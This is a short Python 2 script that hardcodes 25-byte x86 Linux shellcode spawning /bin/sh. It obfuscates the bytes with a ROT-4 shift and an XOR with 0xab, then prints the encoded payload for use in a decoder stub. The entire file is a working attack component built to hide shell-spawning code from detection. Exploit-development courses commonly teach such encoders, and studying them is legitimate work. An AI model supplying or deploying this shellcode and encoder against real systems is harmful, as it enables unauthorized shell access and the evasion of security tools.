from random import randint

#!/usr/bin/python

# spawns a /bin/sh shell
# 25 bytes

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"


# ROT encoding

rot = 4 		# ROT number

# blank arrays to store enc shellcode and stub

encode = []
encode2 = []

for i in bytearray(shellcode):
	b = (i + rot)%256
	b= b ^ 0xab
	encode.append(b)
	encode2.append(b)

			
encode = ("".join("\\x%02x" %c for c in encode))
encode2 = (",".join("0x%02x" %c for c in encode2))


print '[*] Encoded Shellcode: \n' + encode
print '[*] Assembly Ready Shellcode: \n' + encode2
